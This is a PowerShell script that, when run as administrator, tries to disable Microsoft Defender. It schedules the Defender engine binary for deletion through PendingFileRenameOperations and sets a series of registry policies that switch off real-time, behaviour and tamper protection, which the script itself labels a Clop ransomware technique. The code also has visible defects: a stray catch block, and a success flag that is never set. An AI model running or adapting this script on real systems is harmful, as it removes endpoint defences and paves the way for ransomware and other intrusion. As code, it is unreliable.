function IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (IsAdmin) {
    $defenderKilled = $false  # Track if any method succeeded
    $pendingFileRenameSuccess = $false  # Track PendingFileRenameOperations success
    $registryEditSuccess = $false       # Track registry edit success

    # PendingFileRenameOperations technique
    try {
        $DefenderBinaryPath = "C:\Program Files\Windows Defender\MsMpEng.exe"
        $currentOperations = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
        -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations
        $newOperation = "\??\$DefenderBinaryPath`0`0"
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
        -Name "PendingFileRenameOperations" -Value @($currentOperations + $newOperation) -Force
        # Verify the change
        $pendingFileRenameSuccess = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
        -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations -like "*MsMpEng.exe*"
    } catch {
        # Silent failure
    }

    # Registry modification technique
    try {
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpCloudBlockLevel" /t REG_DWORD /d "0" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >$null 2>&1
        cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >$null 2>&1
        
        # Verify the change
        $realTimeProtectionStatus = (Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection").DisableRealtimeMonitoring
        $registryEditSuccess = ($realTimeProtectionStatus -eq 1)
    } catch {
        # Silent failure
    }
    } catch {
        # Silent failure
    }


    # Final output based on results
    if ($defenderKilled) {
        # Degrading red text output
        $lines = @(
            "||||||A red haze shatters Microsoft Defender violently, its protection slipping into darkness.||||||",
            "||||||A r d haze s at ers Mic os ft D fe der vi lent y,  ts pro ectio  s ip ing in o dark es .||||||",
            "|| |||A r d h  e s a  e s  ic os ft D f  d    i le t y   t   ro ec  o  s i  in  in o d rk e   ||||||",
            "|  |||  r d    e s a  e    ic  s f    f  d    i    t y   t      e   o  s    in  in o   r  e   |||| |",
            "    ||    d    e      e          f            i          t             s           o          |||   ",
            "    |                                                                                         ||    "
        )

        foreach ($line in $lines) {
            Write-Host $line -ForegroundColor DarkRed
        }
        if ($pendingFileRenameSuccess) {
            Write-Host "Defender Kill    :                                            [KO] PendingFileRenameOperations Junction" -ForegroundColor DarkGray
        }
        if ($registryEditSuccess) {
            Write-Host "Defender Kill    :                                            [KO] Clop Ransomware Technique" -ForegroundColor DarkGray
        }
    } else {
        # Failure message
        Write-Host "Defender Kill    :                                            [??] Unable to kill Defender" -ForegroundColor DarkYellow
    }
} else {
    # No admin permissions
    Write-Host "Defender Kill    :                                            [??] No Administrative Permissions" -ForegroundColor DarkYellow
}
